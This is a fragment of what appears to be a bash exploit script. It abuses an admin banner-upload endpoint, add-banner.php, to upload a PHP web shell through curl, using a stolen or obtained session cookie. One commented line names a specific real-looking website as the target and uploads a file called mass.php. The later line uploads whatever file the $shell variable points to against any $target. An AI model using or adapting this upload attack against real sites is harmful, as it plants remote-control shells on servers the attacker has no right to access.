#$(curl -F "orderno=1337" -F "productimage1=@mass.php" -F "addb=" https://sherkhannutrition.com/admin/add-banner.php)
...
if [[ -f $shell ]]; then
    ...
    $(curl --cookie "$get_cookie" -F "orderno=1337" -F "productimage1=@$shell" -F "addb=" $target/admin/add-banner.php -o /dev/null)
